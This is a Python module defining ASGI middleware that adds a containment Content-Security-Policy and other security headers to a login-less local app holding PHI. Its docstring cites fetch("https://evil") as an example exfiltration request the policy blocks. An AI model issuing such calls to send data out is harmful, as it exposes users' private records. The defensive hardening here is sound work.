"""HTTP security headers for the local app and its REST API.

The app has no login: it trusts "you are on this computer". That assumption is
carried by ``LoopbackHostGuard`` (Host header) and by the loopback check in
``chartcleaner.api``. Headers cover the remaining browser-side routes an
attacker would use if they got a page open next to the app:

* ``frame-ancestors 'none'`` / ``X-Frame-Options: DENY`` — clickjacking, where a
  hostile page frames the app and tricks the user into pressing Clean/Copy.
* ``default-src 'self'`` — a page that somehow injects markup cannot pull a
  script, image or font from a remote host.
* ``connect-src`` limited to this origin (plus its own websocket) — the
  exfiltration path. Even with a script injected, ``fetch("https://evil")`` is
  refused by the browser before a request leaves the machine.
* ``nosniff`` — stops the browser from reinterpreting a JSON or text response
  as something executable.

``'unsafe-inline'`` and ``'unsafe-eval'`` are required by the NiceGUI/Vue
front-end, so this is not a strict CSP. It is a *containment* CSP: it does not
stop injected inline code from running, it stops that code from talking to, or
loading anything from, anywhere else. That is the property that matters for a
machine holding PHI.
"""

from __future__ import annotations

__all__ = ["CSP", "STATIC_HEADERS", "SecurityHeaders"]

# Websockets are the same origin in every supported deployment; the explicit
# host forms cover the cases where a browser compares ws:// to http:// strictly.
CSP = "; ".join((
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' blob:",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    "connect-src 'self' ws://127.0.0.1:* ws://localhost:* ws://[::1]:*",
    "media-src 'self' blob:",
    "worker-src 'self' blob:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'",
))

STATIC_HEADERS: tuple[tuple[bytes, bytes], ...] = (
    (b"x-content-type-options", b"nosniff"),
    (b"x-frame-options", b"DENY"),
    (b"referrer-policy", b"no-referrer"),
    (b"permissions-policy",
     b"geolocation=(), microphone=(), camera=(), usb=(), payment=(), serial=()"),
    (b"cross-origin-opener-policy", b"same-origin"),
    (b"content-security-policy", CSP.encode()),
)

# Headers the app sets itself (e.g. a static file handler) win over these.


class SecurityHeaders:
    """ASGI middleware that appends the headers to every HTTP response."""

    def __init__(self, app):
        self.app = app

    async def __call__(self, scope, receive, send):
        if scope.get("type") != "http":
            await self.app(scope, receive, send)
            return

        async def send_with_headers(message):
            if message.get("type") == "http.response.start":
                headers = list(message.get("headers") or [])
                present = {name.lower() for name, _ in headers}
                for name, value in STATIC_HEADERS:
                    if name not in present:
                        headers.append((name, value))
                message = {**message, "headers": headers}
            await send(message)

        await self.app(scope, receive, send_with_headers)
